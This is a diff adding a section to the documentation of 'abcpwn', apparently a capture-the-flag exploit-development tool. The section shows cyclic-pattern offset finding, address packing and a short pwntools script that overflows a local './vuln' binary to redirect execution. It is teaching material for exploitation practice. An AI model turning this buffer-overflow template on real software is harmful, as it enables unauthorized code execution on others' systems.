@@ -190,3 +190,41 @@ abcpwn disasm 9090c3 --arch x86_64
 
 (Here `90 90 c3` is just `nop; nop; ret`; pipe real shellcode bytes
 through `disasm` to audit the syscalls it makes.)
+
+## 6. Pairing abcpwn with a process driver
+
+abcpwn is the offline half of an exploit: it produces patterns, offsets,
+gadgets, packed addresses, and payloads without touching the network.
+For the live half -- connecting to a target and driving its I/O -- pair
+it with a process driver such as pwntools. (The `pwn` subcommand is a
+v0.1 placeholder; see the FAQ.)
+
+Do the offline work with abcpwn. Generate a cyclic pattern to send into
+the target, then turn the value it faulted on into an offset:
+
+```bash
+abcpwn cyclic 200
+abcpwn cyclic --find laaa
+```
+
+Pack the address you want to redirect execution to:
+
+```bash
+abcpwn pack 0x401234
+```
+
+Then let the driver own the connection, using the offset abcpwn
+computed:
+
+```python
+import subprocess
+from pwn import process, p64
+
+offset = int(subprocess.check_output(["abcpwn", "cyclic", "--find", "laaa"]))
+io = process("./vuln")
+io.sendline(b"A" * offset + p64(0x401234))
+io.interactive()
+```
+
+The division of labor is the point: abcpwn stays deterministic and
+offline; the driver handles the live tube.
